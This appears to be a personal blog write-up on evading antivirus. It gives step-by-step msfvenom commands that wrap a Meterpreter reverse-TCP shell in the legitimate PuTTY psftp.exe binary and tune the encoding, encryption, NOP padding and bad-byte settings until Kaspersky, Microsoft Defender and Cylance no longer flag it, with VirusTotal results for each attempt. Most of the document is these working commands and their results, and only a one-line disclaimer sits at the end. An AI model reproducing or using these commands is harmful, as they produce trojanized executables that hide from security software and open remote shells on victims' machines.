# Shellcoding - Modern AV Evasion
I'm unsure if it's my luck or not but I have noticed recently that my simple techniques of shellcoding with MSFVenom has been getting caught by anti-viruses. 

**PoC**
https://www.virustotal.com/#/file-analysis/M2ZkYjljNTQ3NjYyYjM1M2YyMjNjMjhiYjA5ZWZjZTg6MTU1MDcxNzE5OA==

I wanted to do a quick write up of simple methods that I use for simple evasion. 

# Keep it Simple Stupid (KISS) Method

I always try to keep my shellcoding simple; custom shellcoding is always wonderful but if you know you're environment this will help a ton.

**Kali Toolkit**
Msfvenom - FUD exe

**Target Enviroment**
Windows 10 x64
*Kaspersky*
*UAC*
Up-to-date databases

psftp.exe
https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

## Challenge: Simple Shellcode AV Evasion
Shellcode #1 

Payload used: 
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.2.28 LPORT=8443 --arch x64 --platform windows --encoder x64/xor_dynamic --encrypt-iv --encrypt xor --encrypt-key neoncat --iterations 20 --timeout 14 -x psftp.exe -f exe > neoncat.exe

**PoC**
https://www.virustotal.com/#/file/0790a58b9f9871abb470af7adc56b9f73adcc6276af984c538b949434ae3f389/

** Notes
Major improvement, but two things concern me. 

**Challenge**
1. ~~Kaspersky is bypassed~~ 
2. **Microsoft** detects the payload
3. Cylance detects payload as well (I feel like they toot their horn too much about their anti-virus and AI detection).

## Attempt #2

Shellcode #2
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.2.28 LPORT=8443 --arch x64 --platform windows --encoder x64/xor --encrypt-iv --encrypt xor --encrypt-key neoncatkey --iterations 24 --timeout 18 -x psftp.exe -f exe > neoncat1.exe

 - Changed encoder to **x64/xor**
 - Encryption key changed to neoncatkey
 - iterations upped four more and timeout increased by four

**PoC**
https://www.virustotal.com/#/file/4310f8a8207b636fde35946966dd6d55e302e89031e07e7071d17b7b51c863fc/

**15/66** caught the EXE.
Now we know our entry point, **x64/xor_dynamic** will be our chosen encoder.

## Attempt #3

Payload:
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.2.28 LPORT=8443 --arch x64 --platform windows --encoder x64/xor_dynamic --encrypt-iv --encrypt rc4 --encrypt-key neoncatkeysignature --iterations 60 --timeout 10 -b '\x00' -n 22 -x psftp.exe -f exe > neoncat1.exe 

~~Kaspersky Bybass~~
~~Microsoft Bypass~~
Cylance didn't scan the file, oddly.

Take away, cleaning up the code can help a bit, so generic removing of 1x null byte and swapping encryption method to rc4 has helped. Upping encoding, and adding a NOP slide seemed to have provided way better results.

**This payload would be the winner**

**PoC**
https://www.virustotal.com/#/file/cb413a14ce6b504c54df7a0b6b705ddc80001fc346b48ea667b81645d8a7c0c6

## Beating Cylance Challenge with MSFVENOM
This one was a fun one, but took super long to encrypt.  I added a very random nope slide, and added additional random null bytes.

payload:
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.2.28 LPORT=8443 --arch x64 --platform windows --encoder x64/xor_dynamic --encrypt-iv --encrypt rc4 --encrypt-key neoncatkeysignaturekey --iterations 135 --timeout 30 -b '\x00\0a\0b' -n 240 -x psftp.exe -f exe > neoncatwinners.exe


**PoC**
https://www.virustotal.com/#/file/2a11bc26476ab122b5a97084cd129180a8445793d5d8e0f41c3dd11803aaad48


## Take aways

Understand that encoding and encryption is your best friend, but you need to make custom shellcode and also tinker with the payload for your evasion to increase.

**Do not use this for illegal activity, you've been warned.
If you want to hack, I highly suggest checking out Hack the Box.**
